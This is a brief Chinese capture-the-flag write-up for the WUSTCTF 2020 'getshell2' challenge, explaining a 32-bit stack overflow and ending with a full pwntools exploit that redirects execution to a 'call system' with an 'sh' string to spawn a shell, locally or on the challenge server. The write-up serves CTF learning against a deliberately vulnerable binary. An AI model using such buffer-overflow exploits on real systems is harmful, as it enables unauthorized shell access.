[[WUSTCTF 2020]getshell2 | NSSCTF](https://www.nssctf.cn/problem/2003)
![[Pasted image 20240901141126.png]]
![[Pasted image 20240901141133.png]]
可栈溢出，有一个没法直接用的backdoor
字符串存在rodata里
![[Pasted image 20240901141307.png]]
可用ROPgadget找到sh的地址
![[Pasted image 20240901141347.png]]
**这里不能用`system@plt`地址，因为plt地址需要返回值，可溢出的地址位数不够`0x24-0x18=0xc`，所以只能用`shell()`里的`call system`来调用system，call函数不用返回值了，它会自己把下一条指令给压进去
如果要用`system@plt`地址的话要用`ret`，但`read`给的长度不足故用call这里代为调用。**
![[Pasted image 20240901142313.png]]
exp:
```python
from pwn import *

context(arch = 'i386', os = 'linux', log_level = 'debug')
local = True
elf = ELF('./getshell2')
if local:
    p = process('./getshell2')
    # pwnlib.gdb.attach(p, 'b main')
else:
    p = remote("node5.anna.nssctf.cn", 21394)

system_addr = elf.symbols['system']
log.success('system_addr: ' + hex(system_addr))
system_addr = 0x8048529
shell = 0x08048670
offset = 0x18 + 4
payload = b'a' * offset + p32(system_addr) + p32(shell)

p.sendline(payload)
p.interactive()
```